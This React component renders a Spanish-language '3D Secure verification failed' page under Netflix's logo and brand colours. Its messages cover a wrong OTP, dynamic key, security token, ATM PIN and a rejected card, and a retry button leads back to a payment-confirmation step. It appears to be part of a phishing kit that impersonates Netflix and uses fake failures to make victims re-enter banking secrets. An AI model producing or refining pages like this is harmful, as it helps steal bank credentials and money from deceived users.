/**
 * Secure Error Page
 * Shows error messages for different 3D Secure verification failures
 * Supports: error-otp, error-dinamica, error-token, error-atm, error-tarjeta
 */

import { Button } from "@/components/ui/button";
import { AlertTriangle, RefreshCw, ShieldX } from "lucide-react";
import { useState } from "react";
import { useLocation, useSearch } from "wouter";

const ERROR_CONFIGS: Record<string, { title: string; message: string; icon: "shield" | "alert" }> = {
  "error-otp": {
    title: "Código OTP Incorrecto",
    message: "El código de verificación ingresado no es válido o ha expirado. Contacta a tu banco para solicitar un nuevo código.",
    icon: "alert",
  },
  "error-dinamica": {
    title: "Clave Dinámica Incorrecta",
    message: "La clave dinámica ingresada no coincide con la generada por tu dispositivo de seguridad. Intenta nuevamente o contacta a tu banco.",
    icon: "shield",
  },
  "error-token": {
    title: "Token de Seguridad Inválido",
    message: "El token ingresado no es válido. Asegúrate de ingresar el código correcto de tu dispositivo token o aplicación bancaria.",
    icon: "shield",
  },
  "error-atm": {
    title: "Clave ATM Incorrecta",
    message: "La clave ATM ingresada no es correcta. Por seguridad, verifica tu clave e intenta nuevamente.",
    icon: "alert",
  },
  "error-tarjeta": {
    title: "Tarjeta Rechazada",
    message: "Tu tarjeta ha sido rechazada por la entidad bancaria. Verifica los datos ingresados o intenta con otro método de pago.",
    icon: "shield",
  },
};

export default function SecureError() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const [isRetrying, setIsRetrying] = useState(false);

  // Get error type from URL query param
  const params = new URLSearchParams(search);
  const errorType = params.get("type") || "error-tarjeta";
  const config = ERROR_CONFIGS[errorType] || ERROR_CONFIGS["error-tarjeta"];

  const handleRetry = () => {
    setIsRetrying(true);
    setTimeout(() => {
      setLocation("/payment-confirmation");
    }, 1500);
  };

  return (
    <div className="relative min-h-[100dvh] w-full overflow-hidden">
      {/* Background */}
      <div
        className="absolute inset-0 bg-cover bg-center bg-no-repeat scale-110"
        style={{
          backgroundImage: `url('')`,
        }}
      />
      <div className="absolute inset-0 bg-gradient-to-b from-black/95 via-black/80 to-black/95" />
      <div className="absolute inset-0 bg-gradient-to-r from-black/60 via-transparent to-black/60" />
      <div className="absolute inset-0 bg-gradient-to-t from-[#E50914]/8 via-transparent to-[#E50914]/3" />

      {/* Header */}
      <header className="relative z-10 flex items-center px-6 py-5 md:px-12">
        <a href="/" className="flex items-center gap-3 transition-opacity hover:opacity-80">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 276.742" height="28" style={{width: 'auto'}}>
            <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676L44.051 119.724v151.073C28.647 272.418 14.594 274.58 0 276.742V0h41.08l56.212 157.021V0h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461V0h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862V242.15c-14.594 0-29.188 0-43.239.539V43.242h-44.862V0H463.22l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433V0h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676V0h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242V0h-42.43v251.338zM1024 0l-54.863 131.615L1024 276.742c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75L871.576 0h46.482l28.377 72.699L976.705 0H1024z" fill="#E50914" />
          </svg>
        </a>
      </header>

      {/* Error Content */}
      <main className="relative z-10 flex min-h-[calc(100vh-88px)] items-center justify-center px-4">
        <div className="animate-fade-in w-full max-w-[480px]">
          <div className="rounded-xl border border-white/[0.06] bg-[#0d0d0d]/90 p-9 shadow-2xl shadow-black/50 backdrop-blur-md md:p-12">
            {/* Error Icon */}
            <div className="mb-7 flex justify-center">
              <div className="relative">
                <div className="absolute inset-0 animate-pulse rounded-full bg-[#E50914]/10 blur-xl" />
                <div className="relative flex h-20 w-20 items-center justify-center rounded-full border border-[#E50914]/20 bg-[#E50914]/[0.08]">
                  {config.icon === "shield" ? (
                    <ShieldX className="h-10 w-10 text-[#E50914]" />
                  ) : (
                    <AlertTriangle className="h-10 w-10 text-[#E50914]" />
                  )}
                </div>
                <div className="absolute -right-1 -top-1 flex h-6 w-6 items-center justify-center rounded-full bg-[#E50914] shadow-[0_0_12px_rgba(229,9,20,0.5)]">
                  <span className="text-xs font-bold text-white">!</span>
                </div>
              </div>
            </div>

            {/* Error Title */}
            <div className="mb-8 text-center">
              <h1
                className="mb-3 text-3xl text-white md:text-4xl"
                style={{ fontFamily: "'Bebas Neue', sans-serif", letterSpacing: "0.02em" }}
              >
                {config.title}
              </h1>
              <p className="text-sm leading-relaxed text-gray-400">
                {config.message}
              </p>
            </div>

            {/* Error Details */}
            <div className="mb-8 rounded-lg border border-white/[0.06] bg-white/[0.03] p-4">
              <div className="flex items-center gap-4">
                <div className="flex h-11 w-11 items-center justify-center rounded-lg border border-[#E50914]/20 bg-[#E50914]/[0.08]">
                  <ShieldX className="h-5 w-5 text-[#E50914]" />
                </div>
                <div className="flex-1">
                  <p className="text-sm font-medium text-white">Verificación de seguridad fallida</p>
                  <p className="text-xs text-gray-500">Código de error: 3DS-{errorType.replace("error-", "").toUpperCase()}-001</p>
                </div>
                <span className="rounded-full border border-[#E50914]/20 bg-[#E50914]/10 px-3 py-1 text-xs font-medium text-[#E50914]">
                  Fallido
                </span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button
                onClick={handleRetry}
                disabled={isRetrying}
                className="h-13 w-full rounded-lg bg-[#E50914] text-base font-semibold text-white shadow-[0_4px_24px_rgba(229,9,20,0.3)] transition-all duration-200 hover:bg-[#f6121d] hover:shadow-[0_6px_32px_rgba(229,9,20,0.45)] active:scale-[0.97]"
              >
                {isRetrying ? (
                  <span className="flex items-center gap-2">
                    <RefreshCw className="h-4 w-4 animate-spin" />
                    Redirigiendo...
                  </span>
                ) : (
                  "Intentar nuevamente"
                )}
              </Button>
              <Button
                onClick={() => setLocation("/login")}
                variant="outline"
                className="h-13 w-full rounded-lg border-white/10 bg-white/[0.03] text-base font-medium text-white transition-all duration-200 hover:border-white/20 hover:bg-white/[0.06] active:scale-[0.97]"
              >
                Volver al inicio
              </Button>
            </div>

            {/* Help Link */}
            <div className="mt-7 border-t border-white/[0.06] pt-5 text-center">
              <p className="text-sm text-gray-500">
                ¿Necesitas ayuda?{" "}
                <a href="#" className="font-medium text-white transition-colors hover:text-[#E50914]">
                  Contacta a soporte
                </a>
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
